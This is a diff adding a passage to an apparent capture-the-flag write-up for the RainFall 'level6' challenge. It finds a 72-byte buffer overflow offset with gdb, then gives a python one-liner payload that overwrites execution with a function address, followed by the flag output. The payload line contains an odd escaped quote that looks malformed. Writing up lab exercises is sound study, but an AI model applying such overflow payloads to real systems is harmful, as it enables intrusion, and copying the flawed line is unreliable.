@@ -43,3 +43,21 @@ That's better, that is what we want to see! How do we get to this function? Well
 So, this is our old friend...
 
 ## Buffer overflow payload
+
+We will find the offset using the **Wiremask** tool:
+~~~shell
+level6@RainFall:~$ gdb ./level6
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae
+Program received signal SIGSEGV, Segmentation fault.
+0x41346341 in ?? ()
+(gdb) 
+~~~
+Found offset of **72**.
+
+Now the payload - must be sent as a argument, because the program segfaults without it:
+~~~shell
+level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x08\x04\x84\x54\"[::-1]')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+~~~
+
+
